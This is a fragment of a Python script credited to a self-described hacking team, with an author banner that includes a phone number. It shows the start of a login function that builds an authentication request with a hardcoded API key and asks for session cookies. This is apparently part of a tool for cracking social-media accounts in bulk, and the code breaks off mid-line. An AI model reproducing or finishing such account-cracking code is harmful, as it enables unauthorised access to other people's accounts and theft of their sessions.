...
--------------------------------------------------
 Auther   : Faiz King
 GitHub   : https://github.com/420cracker
 WhatsApp  : +923495335290
 Location: Pakistan
 Team :  666 HACKERS
...
def login1():
	...
	try:
		...
		data = {'api_key':'882a8490361da98702bf97a021ddc14d','credentials_type':'password','email':id,'format':'JSON', 'generate_machine_id':'1','generate_session_cookies':'1','locale':'en_US','meth
